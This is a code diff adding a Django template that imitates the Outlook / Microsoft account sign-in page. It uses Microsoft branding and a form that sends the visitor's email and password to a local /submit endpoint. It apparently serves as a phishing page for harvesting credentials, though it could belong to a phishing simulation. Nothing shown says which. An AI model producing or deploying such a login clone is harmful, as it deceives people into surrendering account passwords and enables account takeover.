@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to Outlook</title>
+  {% load static %}
+  <link rel="stylesheet" href="{% static 'css/styles.css' %}">
+</head>
+<body>
+  <div class="container">
+    <img src="/media/microsoft-logo.png" alt="Microsoft Logo">
+    <h1>Sign in</h1>
+    <p>Use your Microsoft Account</p>
+    <form action="/submit" method="POST">
+      {% csrf_token %}
+      <input type="email" name="email" placeholder="Email or Phome Nubmer" required>
+      <input type="password" name="password" placeholder="Password">
+      <button type="submit">Sign in</button>
+    </form>
+  </div>
+</body>
+</html>
